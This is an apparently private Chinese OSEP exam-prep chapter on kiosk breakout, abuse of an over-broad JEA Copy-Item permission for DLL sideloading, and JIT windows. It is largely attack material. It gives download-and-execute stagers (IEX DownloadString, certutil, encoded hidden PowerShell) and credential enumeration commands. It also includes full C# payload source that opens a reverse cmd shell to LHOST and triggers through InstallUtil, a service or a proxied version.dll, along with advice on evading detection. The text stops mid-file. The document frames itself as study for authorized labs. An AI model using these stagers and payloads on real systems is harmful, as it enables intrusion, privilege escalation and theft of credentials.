::: warning 私人教材 · 仅供授权实验与备考学习
本文是个人备考教材，仓库不公开。源码只用于 OSEP 官方实验/考试环境或你拥有书面授权的目标。禁止转发到公开网络、禁止对未授权系统使用。
:::

# 14 · 场景 41–43：Kiosk 突破 · JEA 越权文件复制 · JIT 时间窗

> 依据说明：本主题在 `reference/osep-cheatsheet.md` 中没有直接条目，以下内容按教材第 16 章（受限桌面 / Kiosk 突破）与第 23 章（PowerShell 受限端点 JEA 与临时授权 JIT）的实验思路整理，并补充通用枚举与验证方法。
> 行文约定：中文说明 + 英文命令；占位符统一为 `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`。
> 本模块文件：[`docs/14-kiosk-jea-jit.md`](/modules/14-kiosk-jea-jit)、`scripts/powershell/m14-jea-file-copy.ps1`、`scripts/csharp/m14-jea-service-dll.cs`、`scripts/powershell/m14-jit-admin-window.ps1`、`scripts/infra/m14-kiosk-breakout.md`。

## 0. 场景总览

| 场景 | 主题 | 入口 → 目标 | 主要脚本 |
|---|---|---|---|
| 41 | Kiosk 突破 | 受限单应用桌面 → 本机命令执行（kiosk 用户级） | `m14-kiosk-breakout.md` 路径清单 |
| 42 | JEA 过宽文件复制 | 受限 PowerShell 端点（仅 Copy-Item 等白名单命令）→ 服务账户代码执行 | `m14-jea-file-copy.ps1` + `m14-jea-service-dll.cs` |
| 43 | JIT 时间窗 | 临时管理员授权 → 窗口内既定命令 + 窗口外残余票据利用 | `m14-jit-admin-window.ps1` |

共性前提：已获得域内凭据（`DOMAIN\USER` + `PASS` 或 `NTHASH`）且对 `TARGET` 网络可达——场景 41 常为 RDP/物理会话，42 需 WinRM（5985/5986），43 需 LDAP（389）或 WinRM。

---

## 场景 41 · Kiosk 突破路径清单

### 场景回顾
目标机以“单应用 Kiosk”形态运行：Windows 外壳被替换或用 Assigned Access 锁定到某个应用（浏览器、自研程序、PDF 阅读器等）。我们能与之交互（物理终端或 RDP），但开始菜单、Win+R、任务管理器、直接开 cmd/PowerShell 均不可用或被策略移除。任务：找出至少一条路径拿到**命令执行**。突破通常先落在 kiosk 用户身份（普通权限），后续提权/横向走常规流程（见 M06/M07）。

### 前提与假设
- kiosk 用户是普通域/本地用户，不含管理员权限——突破后预期先得到低权 shell。
- 不假设“所有系统通道都封了”：很多 kiosk 只锁表面入口（外壳/开始菜单），深层对话框通道（打开/另存为/打印/帮助）经常没封。
- RDP 进入后若 kiosk 应用崩溃或可被关闭（Alt+F4）而退到桌面，等于直接拿到桌面——先试探外壳状态，别急着打洞。
- 需要最终能回连攻击机（`LHOST` 对 kiosk 可达）或能把命令结果带出来。

### 准备（攻击机侧）
- 起监听：`nc -lvnp LPORT`，或 C2 listener。
- 备好二阶段 `PAYLOAD`（PowerShell 一行或可执行文件），并记录可投递的 `URL`（HTTP/SMB）。
- 手边放路径清单速查 `scripts/infra/m14-kiosk-breakout.md`，逐项勾选。
- 若走 RDP：确认剪贴板/本地盘映射是否可用（可用则投递更容易）。

### 执行步骤
按“成本从低到高、先静默后动静”逐项试通道，每项都先想好**可用信号**再动手：

1. **外壳与应用状态**：Alt+Tab 有无其他窗口；Win 键/Ctrl+Esc 是否弹开始菜单；kiosk 应用被关（Alt+F4/任务栏关闭）后是否落到桌面；Ctrl+Shift+Esc 是否弹任务管理器。
2. **浏览器 / HTML 宿主**（kiosk 应用是浏览器时最先试）：
   - IE/旧内核（WebBrowser 控件同）：地址栏输入 `file:///C:/Windows/System32/cmd.exe` → 出现“打开/运行”提示 → 选运行即得 cmd。
   - Chrome/Edge：文件 URL 只会触发下载，不能直接执行（现代内核默认如此），转第 3、4 类对话框通道。
3. **通用文件对话框逃逸**（kiosk 应用内任意“打开/另存为/导入/导出/附加文件”按钮）：现代打开/另存对话框自带地址栏与文件名框——地址栏输入 `C:\Windows\System32` 回车进入目录后，再在地址栏输入 `cmd.exe` 回车（Explorer 系对话框会执行 PATH 内程序名；不识别就输完整路径）。**这是最常见且常被漏封的通道。**
4. **打印/导出对话框**：任何“打印到 PDF / 另存 PDF / 导出报表”入口都带文件对话框，同第 3 条复用。
5. **帮助系统**：应用“帮助”若以 .chm 打开（hh.exe 窗口），CHM 内“跳转 URL/快捷方式”可指到外部程序；若帮助在浏览器打开 → 回到第 2 条。
6. **辅助功能 / 输入法**：Win+U 可用则弹“轻松使用”，其链接（讲述人/屏幕键盘）有时能带出系统界面；屏幕键盘上常有 Win 键虚拟按键。
7. **任务管理器通道**：Ctrl+Shift+Esc → 文件 → 运行新任务 → 输入 `cmd`。若弹 UAC 说明该操作在请求提权，换用户级通道（任务管理器“运行新任务”对当前用户不总是提权，值得试）。
8. **拿到命令执行后立刻固化现场**：把通道和复现步骤写进清单，然后弹回 shell（见验证），避免反复进出。

### 用到的脚本
- `scripts/infra/m14-kiosk-breakout.md`：分通道的路径清单速查，含每条“可用信号 / 被封特征 / 备注”，用于现场逐项勾选。

### 验证
- 出现回连：`nc -lvnp LPORT` 收到连接；或命令回显可见。
- 在 shell 里确认身份与网络：`whoami`（应为 kiosk 用户）、`ipconfig`、`netstat -ano`、`cmdkey /list`、`dir %APPDATA%\Microsoft\Credentials`。
- 若只是拿到“对话框内文件系统访问”而非完整 shell，验证标准是“能否稳定复现且不打断 kiosk 业务”。
- 记录完整性级别：`whoami /groups | findstr /i "完整性 强制"`——判断下一步是提权还是可直接横向。

### 失败分支与备选
- **打开/另存对话框全被策略封**：试打印对话框、错误对话框（故意触发 kiosk 应用报错，常带“查看日志/详细信息/打开位置”类链接）；或屏幕键盘/触摸键盘的 Win 键。
- **浏览器只下载不执行**：下载后用第 3 条对话框通道定位到下载目录再执行；或投递 `.hta`/`.lnk` 等由系统处理程序打开的文件，再从处理程序身上找对话框/跳转通道。
- **用户级通道全封**：回到系统级入口——若可物理接触，考虑启动顺序/固件（超出常见考试范围）；RDP kiosk 可断开重连观察登录前界面（辅助功能入口 sethc/utilman 属登录前场景，需系统盘可写前提，见 M06 思路）。

### 考试注意 OPSEC
- 每个通道**试一次就够**：反复试探会在外壳/EDR 留下大量可疑交互；先试静默的对话框类（无进程行为），shell 回弹前尽量不落盘。
- 弹 cmd 的窗口可能一闪而过：把二阶段拼成一条命令（`cmd /c powershell -nop -w hidden -enc <PAYLOAD>`）减少窗口停留时间。
- 突破后优先内存通道（PowerShell 反射 / Add-Type 内存加载），不要在 kiosk 可写目录放 exe。
- 保持清单勾选记录：交报告能说清“哪条通道通的、哪些被封、复现步骤”。

---

#### 源码 `scripts/infra/m14-kiosk-breakout.md` {#scripts-infra-m14-kiosk-breakout-md}

````markdown
# Kiosk 突破路径清单（场景 41）

> 用途：受限 Kiosk 桌面（单应用 / Assigned Access / 替换外壳）下，逐项勾选"能否拿到命令执行"的通道清单，
> 以及取得执行机会后如何稳定落到 payload。
> 场景：41（只有受限 Kiosk 桌面，没有终端）
> 依赖：物理终端或 RDP 交互；攻击机侧已起监听（`nc -lvnp LPORT`）并备好二阶段 `PAYLOAD` 与投递用 `URL`
> 使用：现场按"成本从低到高、先静默后动静"逐项试，每条**试一次就够**，把结果勾在 §5 清单里（报告要写清哪条通、哪条被封）
> 占位符：`LHOST`（攻击机 IP）、`LPORT`（监听端口）、`TARGET`（目标机）、`USER`（kiosk 账户）、`URL`（投递地址）、`PAYLOAD`（载荷文件名）
> 测试状态：操作笔记，无可执行代码；所有命令均需在实验环境按实际版本核对（尤其浏览器内核与 Edge/Chrome 策略）

---

## 1. 先确认限制形态（别急着打洞）

| 要确认的事 | 怎么确认 | 结论怎么用 |
|---|---|---|
| 是"单应用 Kiosk"还是"受限 shell" | Win 键 / Ctrl+Esc / Ctrl+Alt+Del / Alt+F4 | Alt+F4 关掉 kiosk 应用能落到桌面 = 直接拿到桌面，后续不用打洞 |
| 有没有其它窗口 | Alt+Tab、任务栏 | 有残留 Explorer/对话框 = 优先从它找"打开/另存为" |
| 任务管理器可用吗 | Ctrl+Shift+Esc | 可用 → 走 §2.7（文件 → 运行新任务） |
| 有没有文件对话框 | 应用内"打开/另存为/导入/导出/附加文件/打印"按钮 | 有 → §2.2 是最常见且最常被漏封的通道 |
| 有没有可写位置 | 用户目录、`%TEMP%`、浏览器下载目录 | 决定能否落盘；不能落盘就走纯内存通道 |

---

## 2. 通道清单

### 2.1 浏览器地址栏 `file://`（kiosk 应用是浏览器时最先试）

| 内核 | 操作 | 可用信号 | 被封特征 |
|---|---|---|---|
| IE / WebBrowser 控件（同内核） | 地址栏输入 `file:///C:/Windows/System32/cmd.exe` → 弹出"打开/保存"提示 → 选**运行** | 直接弹出 cmd 窗口 | 提示条被策略禁用 / 只让保存 |
| Chrome / Edge（现代内核） | 同上 | **只会触发下载，不会执行**（默认行为） | 下载完成 → 转 §2.2 用文件对话框定位到下载目录再执行 |
| 任意内核 | `file:///C:/Windows/System32/` 浏览目录 | 能列目录 = 至少有文件系统浏览权 | 提示"无法访问" = 文件 URL 被封 |

> 备用入口：`about:` 页面里的链接、开发者工具（F12，若未禁）、"打印"入口（见 §2.4）。

### 2.2 通用文件对话框（打开 / 另存为 / 导入 / 导出 / 附加文件）

**最常见且常被漏封的通道。** 现代打开/另存对话框自带地址栏与文件名框：

```text
1) 点开任意"打开/另存为/导入/导出/附加文件"按钮
2) 地址栏输入  C:\Windows\System32   回车   → 进入该目录
3) 地址栏输入  cmd.exe                回车   → Explorer 系对话框会执行 PATH 内程序名
   （不识别程序名就输完整路径 C:\Windows\System32\cmd.exe）
4) 或文件名框输入 \\LHOST\share\PAYLOAD 直接执行 SMB 上的文件（出网/共享可达时）
```

| 可用信号 | 被封特征 | 备注 |
|---|---|---|
| 地址栏可编辑并跳转成功 | 地址栏只读 / 只能点目录树 | 目录树也能走到 System32，再在文件名框输 `cmd.exe` |
| 回车后弹出 cmd 窗口 | 双击文件被"打开方式"策略拦 | 换 `.bat`/`.cmd`/`.exe` 都试一次；`.lnk` 也可 |

### 2.3 帮助 → 查看（Help 菜单 / hh.exe / .chm）

```text
1) 应用"帮助"菜单 → 若以 .chm 打开（hh.exe 窗口）：
   - CHM 内"跳转 URL / 快捷方式"可指向外部程序
   - hh.exe 窗口里 右键 → 查看源 / 打印 → 会带出文件对话框（回到 §2.2）
2) 若帮助在浏览器里打开 → 回到 §2.1/§2.2
3) 帮助窗口的"选项 → 查看 / 打开"按钮同样落到文件对话框
```

| 可用信号 | 被封特征 | 备注 |
|---|---|---|
| .chm 窗口出现且能右键 | 帮助菜单灰掉 / 打开即报错 | 报错对话框本身也是通道（见 §2.8） |

### 2.4 打印 / 导出对话框（打印到 PDF / 另存 PDF / 导出报表）

```text
1) 任意"打印"入口（Ctrl+P）→ 选择"另存为 PDF"/"打印到 PDF"/"导出"
2) 弹出的"另存为"对话框 = 标准文件对话框 → 完全复用 §2.2 的做法
3) 打印预览窗口里常有"打开/保存/查找"按钮，同样带对话框
```

| 可用信号 | 被封特征 | 备注 |
|---|---|---|
| 出现"另存为 PDF"文件对话框 | 无打印权限 / 打印机驱动被移除 | 试用"导出为 XPS/CSV/图片"等其它导出入口 |

### 2.5 已安装应用（白名单内的程序）

| 应用 | 突破口 | 落到执行的动作 |
|---|---|---|
| Notepad（记事本） | 文件 → **打开** / **另存为** → 路径栏 | 路径栏输 `C:\Windows\System32`，文件名框输 `cmd.exe` 回车 |
| Notepad | 帮助 → 关于/反馈 链接（部分版本带 http 链接） | 链接在浏览器打开 → 回 §2.1 |
| WordPad | 文件 → 打开 →"插入对象"/文件对话框 | 同 §2.2；插入对象可指向可执行文件 |
| mspaint（画图） | 文件 → 打开 / 另存为 | 同 §2.2 |
| calc（计算器） | 帮助 → 关于 → 链接（老版本）/ 导航菜单 | 老版本"关于"里的 http 链接能唤起浏览器；新版基本无解，改用其它应用 |
| PDF 阅读器 | 打开文件 / 保存副本 / 打印 / 附件 | 三处都带文件对话框 |
| 浏览器 | 下载目录 + 文件对话框；下载项"在文件夹中显示" | 显示后即 Explorer 窗口 → 地址栏输 `cmd.exe` |
| 文件被关联到 Office 查看器 | 打开 → 宏/对象（多数 kiosk 已禁宏） | 宏被禁就只用其文件对话框 |
| cmd / PowerShell 被允许 | 已经是终端，无需突破 | 直接执行 §3 |

### 2.6 辅助功能 / 输入法

| 操作 | 可用信号 | 备注 |
|---|---|---|
| Win+U（轻松使用中心） | 弹出面板，内含讲述人/屏幕键盘链接 | 讲述人窗口有时带"打开"入口 |
| 屏幕键盘（osk） | 键盘上有 Win 键虚拟按键 | 可尝试 Win+R / Win+E；很多 kiosk 只锁外壳，不锁这里 |
| 触摸键盘 / 输入法栏 | 能唤起输入法设置窗口 | 设置窗口常带"打开位置/浏览"按钮 |

### 2.7 任务管理器

```text
Ctrl+Shift+Esc → 文件 → 运行新任务 → 输入 cmd（或 powershell）
```

| 可用信号 | 被封特征 | 备注 |
|---|---|---|
| "运行新任务"可用且以当前用户起 cmd | 弹 UAC 说明在请求提权 → 换用户级通道 | 用户级通道全封时才考虑 UAC 路线（见 M06） |

### 2.8 错误对话框（故意触发）

故意让 kiosk 应用报错（畸形输入、超大文件、断网操作），错误框常带"查看日志 / 详细信息 / 打开位置 / 导出诊断"，
这些按钮最终都落到文件对话框或 Explorer 窗口。

---

## 3. 拿到执行机会后：把机会固化成稳定 shell

**原则：先静默（内存）后落盘；命令预先拼好，窗口一闪而过也能跑完。**

```bat
:: ① 一条命令成型（cmd 一闪而过也无所谓，减少窗口停留时间）
cmd /c powershell -nop -w hidden -enc <PAYLOAD的Base64>

:: ② 内存下载执行（不落盘，kiosk 可写目录不放 exe）
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL/s.ps1')"

:: ③ 必须落盘时用系统自带下载器，优先 %TEMP%
certutil -urlcache -split -f URL/PAYLOAD %TEMP%\PAYLOAD && %TEMP%\PAYLOAD

:: ④ 回连后立刻确认身份与网络（决定下一步是提权还是直接横向）
whoami & hostname & ipconfig & netstat -ano & cmdkey /list
whoami /groups | findstr /i "Mandatory"      :: 看完整性级别：Medium=需提权，High=已提升
dir %APPDATA%\Microsoft\Credentials
```

> `PAYLOAD` 生成时填 `LHOST`/`LPORT`；攻击机保持 `nc -lvnp LPORT` 常开。
> kiosk 每次重启会还原的场景：不要依赖持久化，当前会话内一次做完。

---

## 4. 失败分支

1. **打开/另存对话框全被策略封** → 打印对话框（§2.4）、错误对话框（§2.8）、屏幕键盘的 Win 键（§2.6）。
2. **浏览器只下载不执行** → 下载后用 §2.2 定位到下载目录执行；或投递由系统处理程序打开的文件（`.hta`/`.lnk`/`.chm`），
   再从处理程序身上找对话框/跳转通道。
3. **用户级通道全封** → 系统级入口（物理接触时的启动顺序/固件，超出常见考试范围）；
   RDP kiosk 可断开重连，观察登录前界面（辅助功能入口属登录前场景，需系统盘可写，见 M06）。
4. **写启动目录被 ACL 拒绝** → 换 `%TEMP%`/用户目录；能创建计划任务就走计划任务触发。
5. **Kiosk 每次重启还原** → 放弃持久化，全部动作压在当前会话内完成。

---

## 5. 现场勾选清单

```text
[ ] Alt+F4 / 关闭应用是否落到桌面        [ ] Win 键 / Ctrl+Esc 是否弹开始菜单
[ ] Ctrl+Shift+Esc 任务管理器            [ ] 文件 → 运行新任务 → cmd
[ ] 浏览器地址栏 file:///C:/Windows/System32/cmd.exe    [ ] 打开对话框地址栏 → cmd.exe
[ ] 另存为对话框 → cmd.exe               [ ] 打印/导出 PDF → 另存为对话框
[ ] 帮助 → 查看 / hh.exe / .chm          [ ] 已安装应用：Notepad / WordPad / mspaint / calc / PDF
[ ] Win+U 轻松使用 / 屏幕键盘 Win 键      [ ] 故意触发报错 → 查看日志/打开位置
[ ] 执行机会已固化（回连成功 / 命令回显可见）
[ ] 记录：通的通道、被封的通道、复现步骤（报告要写）
```

---

## 6. OPSEC 提醒

- 每个通道**试一次就够**：反复试探会在外壳/EDR 留下大量可疑交互；优先试无进程行为的对话框类。
- 回弹前尽量不落盘；突破后优先内存通道（PowerShell 反射 / `Add-Type` 内存加载）。
- Kiosk 常带屏幕录制/监控，操作要快、命令要预先写好并一次粘贴执行。
- 保持清单勾选记录：报告里要能说清"哪条通道通的、哪些被封、如何复现"。
````

## 场景 42 · JEA 过宽文件复制 + 服务加载触发

### 场景回顾
域内存在 PowerShell 受限端点（JEA，登录时用 `-ConfigurationName` 指定会话配置，如 `BackupMaintenance`）。我们控制的低权账户是某 JEA 角色的成员，该角色能力（Role Capability）**过宽**：允许 `Copy-Item` 且 `-Destination` 未被限制在安全目录（可写到服务目录等），或额外允许对指定服务 `Restart-Service`。能力白名单不包含任意命令执行，所以不能直接在 JEA 会话里跑代码。攻击思路：用文件复制把恶意 DLL 放到**服务/守护进程会从该目录加载 DLL**的位置（目录内“缺的依赖 DLL”或插件 DLL），再触发加载，让代码以服务账户上下文执行。

### 前提与假设
- 知道 JEA 端点名，且我们的账户是端点权限（Permission）允许的成员（可用 `Get-PSSessionConfiguration` 或凭记忆/社工获得端点名）。
- 存在“目录可被文件复制写入 + 服务会从该目录加载 DLL”的目标：最常见是第三方服务的安装目录（DLL 搜索顺序侧加载）或服务的插件/模块目录。
- 至少有一种触发手段：角色允许 `Restart-Service`/`Stop-Service`+`Start-Service`；或服务会周期自动重启；或管理员会手动重启该服务。
- JEA 会话以虚拟账户/托管服务账户运行，落盘受该账户权限约束——能越权写到服务目录正是“能力过宽”的体现。

### 准备（攻击机侧）
- 准备恶意 DLL：`scripts/csharp/m14-jea-service-dll.cs`（或按目标缺的依赖类型改用 M04 的 C 原生 DLL 模板）。
- 起监听：`nc -lvnp LPORT`；确认 `LHOST` 对 `TARGET` 的 5985/5986 可达。
- 尽量先弄清目标服务 exe 的真实缺失依赖名与架构（x64/x86）——侧加载 DLL 的**文件名与架构必须匹配宿主**。

### 执行步骤
1. **发现端点**（能从别的机器/凭据枚举时）：
   `Get-PSSessionConfiguration | Select-Object Name, Permission`
2. **构造凭据并连接 JEA 端点**：
   `$cred = Get-Credential DOMAIN\USER`；`Enter-PSSession -ComputerName TARGET -ConfigurationName <JEA端点> -Credential $cred`
   （NTHASH 无明文时，WinRM 直连不支持哈希，改用 `m15` 的 evil-winrm/PowerShell 哈希登录模板；或先把 NTHASH 换票。）
3. **枚举会话内可用命令**：`Get-Command | Select-Object Name, Source`——JEA 会隐藏未允许的命令，**能看到的就是能用的**。确认 `Copy-Item` 在列；`Restart-Service`/`Test-Path` 是否在列决定触发与验证策略。
4. **探边界（无害文件）**：`Copy-Item C:\Windows\Temp\probe.txt -Destination <候选目录>\m14probe.txt`。成功/报错信息用于判断该目录是否在复制能力内（报 Access Denied/路径被排除 → 换目录）。
5. **确定目标服务与 DLL 名**：若能列出服务（`Get-Service` 在白名单内则直接列）；否则结合目标机已知软件判断。要点：**投放文件名必须是宿主缺的依赖或会加载的插件名**，架构匹配。
6. **投放恶意 DLL**：`Copy-Item \\LHOST\share\evil.dll -Destination "<服务目录>\<缺的依赖名>.dll" -Force`（先把原 DLL 备份副本留攻击机侧，便于事后恢复）。
7. **触发加载**：
   - 角色允许：`Restart-Service <服务名>`（先 `Stop-Service` 再 `Start-Service` 也试一下，有的能力只放行其一）。
   - 不允许服务控制：等待服务自动重启/管理员操作，监听保持在线、持久化提前备好。
8. **回收与清理**：shell 回连后 `whoami` 应为服务账户；核对监听日志与 DLL 行为后，按需恢复被覆盖文件。

### 用到的脚本
- `scripts/powershell/m14-jea-file-copy.ps1`：从攻击机自动化第 2、4、6、7 步（构造凭据 → 进 JEA 会话 → 枚举命令 → 无害探边界 → 投放 → 触发），每步输出结果。
- `scripts/csharp/m14-jea-service-dll.cs`：被投放的 DLL 载荷模板（加载即回连/执行命令两种模式，含编译路线说明）。

### 验证
- 会话内 `Get-Command` 能看到 `Copy-Item` 等白名单命令 → 端点可达、能力符合预期。
- 探路文件确实写入目标目录（会话内若允许 `Test-Path` 直接验；否则用第二步 Copy-Item 覆盖同名文件看是否报“已存在/被占用”间接判断）。
- 触发后监听器收到回连，`whoami` 为服务账户 → 端到端成功。

### 失败分支与备选
- **`-Destination` 实际被限制**（报错/被排除）：设法读角色能力文件定位允许路径——`C:\Program Files\WindowsPowerShell\Modules\<模块>\<角色能力>\*.psrc` 的 `FileSystem` 段（若能读）；或改投“共享根目录 + 目标服务把共享当模块/配置目录加载”的组合。
- **服务不加载放进去的 DLL**（名字或依赖猜错）：先在攻击机用 dumpbin/ProcMon 思路确认服务 exe 导入表缺哪个 DLL；无 ProcMon 时查同版本软件的“已知可侧加载 DLL 名”清单（如 `version.dll`、`winmm.dll` 类）。
- **没有任何服务控制命令且服务不会自动重启**：文件复制能力可换触发对象——覆盖可写位置的登录脚本、计划任务脚本、`Startup` 快捷方式、被周期执行的配置文件，把“服务触发”改成“事件触发”（用户登录/计划任务）。
- **服务上下文是 NetworkService/LocalService 而非 SYSTEM**：接受该上下文做横向，或换一个以 SYSTEM 运行的服务目标。

### 考试注意 OPSEC
- JEA 端点通常强制 **Transcript**，会话内所有命令都会被记录：敏感动作尽量放进 DLL 内部完成，JEA 会话里只留 `Copy-Item`/`Restart-Service` 这类“符合角色”的操作。
- 探路用无害文件、文件名贴近业务习惯；正式 DLL 命名与宿主缺的依赖一致可大幅降低可疑度。
- 触发服务重启可能造成业务中断：优先选非关键/副本服务；触发前记录服务原状态，收尾恢复。
- DLL 里的回连地址 `LHOST` 投放前**最后确认一次**——放出去就无法修改。

---

#### 源码 `scripts/csharp/m14-jea-service-dll.cs` {#scripts-csharp-m14-jea-service-dll-cs}

````csharp
// 用途：JEA 场景的服务 DLL 载荷——被高权限上下文（服务账户 / SYSTEM / InstallUtil 宿主）加载时执行，
//       动作是"以更高权限写入某个低权账户写不进去的位置"（验证越权写成功），可选再回连 LHOST:LPORT。
// 场景：42（JEA 会话只暴露少量命令，其中包含权限过宽的文件复制）
// 依赖：.NET Framework 3.5+/4.x（csc.exe 自带于 C:\Windows\Microsoft.NET\Framework64\v4.0.30319）
// 编译：
//   # ① InstallUtil 触发路线（不需要原生导出，最稳）
//   csc.exe /target:library /out:m14-jea-service-dll.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
//   # ② 原生导出（侧加载）路线：需要 DllExport 工具链（3F/DllExport 或 UnmanagedExports）后加 -define:USE_DLLEXPORT
//   csc.exe /target:library /define:USE_DLLEXPORT /out:version.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
//   # ③ 32 位宿主必须用 32 位 csc：C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe（x64 服务不能加载 x86 DLL）
// 使用：
//   # InstallUtil 触发（JEA 会话里若允许 Restart-Service，也可重启目标服务触发）
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U m14-jea-service-dll.dll
//   # 侧加载触发：DLL 命名为宿主缺的依赖名（如 version.dll）放进服务目录，重启服务
//   copy m14-jea-service-dll.dll "C:\Program Files\TargetSvc\version.dll" /Y
//   sc stop TargetSvc && sc start TargetSvc
// 占位符：LHOST=攻击机 IP，LPORT=监听端口（回连模式；未替换时自动跳过回连只做标记写入）
// 测试状态：未在本机编译（无 csc）；代码按 .NET Framework 4.x API 编写，需在实验环境编译验证
//
// 导出名与调用约定（决定侧加载成败，务必逐字核对）：
//   1. 文件名必须与宿主"要找的那个 DLL"完全一致（ldd/dumpbin /imports 或 ProcMon 看到的缺失依赖，
//      常见可侧加载名：version.dll、winmm.dll、winhttp.dll、dbghelp.dll、profapi.dll）。
//   2. 导出函数名、参数个数与顺序、返回值必须与原 DLL 一致；本文件给出 version.dll 的六个导出。
//   3. 调用约定：x86 用 StdCall（[UnmanagedFunctionPtr(CallingConvention.StdCall)]），x64 下所有约定等价，
//      但特性仍写 StdCall 以保持一致；名字修饰（_GetFileVersionInfoW@16）由 DllExport 工具处理，
//      生成后用 dumpbin /exports version.dll 核对导出名没有多余前缀/后缀。
//   4. 不要导出 DllMain：托管 DLL 的 DllMain 由 CLR 接管，手工导出容易死锁加载器锁。
//      需要"加载即执行"时用模块初始化（本文件的静态构造函数已在首次调用导出时触发 Payload）。
//   5. 架构必须匹配宿主：x64 服务加载 x86 DLL 会直接报 BadImageFormatException。

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

#if !USE_DLLEXPORT
// 使用 DllExport 工具链时（上面的 -define:USE_DLLEXPORT），该特性由工具提供，本段被跳过。
// 不使用工具链时（只走 InstallUtil / 托管服务路线），这里给出同名占位特性，保证文件能直接用 csc 编译。
[AttributeUsage(AttributeTargets.Method, AllowMultiple = false)]
public sealed class DllExportAttribute : Attribute
{
    public DllExportAttribute() { }
    public DllExportAttribute(string exportName) { ExportName = exportName; }
    public string ExportName { get; set; }
    public CallingConvention CallingConvention { get; set; }
}
#endif

namespace M14Jea
{
    // 载荷本体：所有触发路线（InstallUtil / 服务 / 原生导出）最终都调用 Payload.Run()
    public static class Payload
    {
        // 高权写入目标：普通域用户写不进去，能写成功就说明"越权写 + 代码以服务账户运行"都成立
        private const string MarkerPath = @"C:\Program Files\Common Files\m14-jea.marker";

        // 回连目标（占位符，投放前替换；未替换时自动跳过回连）
        private const string LHOST = "LHOST";
        private const int LPORT = 4444;

        private static int _done = 0;

        public static void Run()
        {
            // 只跑一次：宿主可能多次调用导出函数/多次加载
            if (Interlocked.Exchange(ref _done, 1) == 1) return;

            try { WriteMarker(); }
            catch (Exception ex) { TryLog("marker failed: " + ex.Message); }

            try { if (!LHOST.Contains("LHOST")) ReverseShell(LHOST, LPORT); }
            catch (Exception ex) { TryLog("rev failed: " + ex.Message); }
        }

        // 动作①：以更高权限写文件——这是本 DLL 的"任务本体"，也是最好验证的一步
        private static void WriteMarker()
        {
            string who;
            try { who = WindowsIdentity.GetCurrent().Name; }
            catch { who = Environment.UserName; }

            string body = "m14-jea-service-dll marker\n"
                        + "time : " + DateTime.Now.ToString("o") + "\n"
                        + "who  : " + who + "\n"
                        + "proc : " + Process.GetCurrentProcess().ProcessName + "\n"
                        + "path : " + MarkerPath + "\n";

            string dir = Path.GetDirectoryName(MarkerPath);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            {
                // 目录不存在也照建：这一步本身就要求高权限
                Directory.CreateDirectory(dir);
            }
            File.WriteAllText(MarkerPath, body, Encoding.UTF8);
        }

        // 动作②：可选回连（需要先把 LHOST/LPORT 替换成真实值）
        private static void ReverseShell(string host, int port)
        {
            TcpClient client = new TcpClient();
            client.Connect(host, port);
            NetworkStream ns = client.GetStream();

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();

            Thread t1 = new Thread(() => { try { p.StandardInput.BaseStream.CopyTo(ns); } catch { } });
            Thread t2 = new Thread(() => { try { ns.CopyTo(p.StandardInput.BaseStream); } catch { } });
            t1.IsBackground = true; t2.IsBackground = true;
            t1.Start(); t2.Start();

            p.WaitForExit();
            try { client.Close(); } catch { }
        }

        // 任何异常都不要往外抛：服务启动失败会写事件日志，反而更暴露
        private static void TryLog(string msg)
        {
            try
            {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "m14-jea-err.txt"),
                                   DateTime.Now.ToString("o") + " " + msg + Environment.NewLine);
            }
            catch { }
        }
    }

    // 路线①：InstallUtil 宿主（InstallUtil.exe /U m14-jea-service-dll.dll 触发 Uninstall，Install 同理）
    [RunInstaller(true)]
    public class JeaInstaller : Installer
    {
        public override void Install(System.Collections.IDictionary stateSaver)
        {
            Payload.Run();
            base.Install(stateSaver);
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Payload.Run();
            base.Uninstall(savedState);
        }
    }

    // 路线②：托管服务（若目标服务是 .NET 服务，可把它作为插件/依赖 DLL 放进服务目录后重启服务）
    public class JeaService : ServiceBase
    {
        public JeaService() { ServiceName = "M14JeaSvc"; }

        protected override void OnStart(string[] args)
        {
            // 必须立刻返回，否则 SCM 报"服务启动超时"（1053）——载荷放到后台线程
            Thread t = new Thread(new ThreadStart(Payload.Run));
            t.IsBackground = true;
            t.Start();
        }

        protected override void OnStop() { }
    }

    // 路线③：原生导出（侧加载）。以 version.dll 为例，导出名/签名/调用约定照抄真实 Windows API。
    public static class Exports
    {
        private const string RealDll = @"C:\Windows\System32\version.dll";

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool GetFileVersionInfoWDelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool GetFileVersionInfoADelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int GetFileVersionInfoSizeWDelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate int GetFileVersionInfoSizeADelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool VerQueryValueWDelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

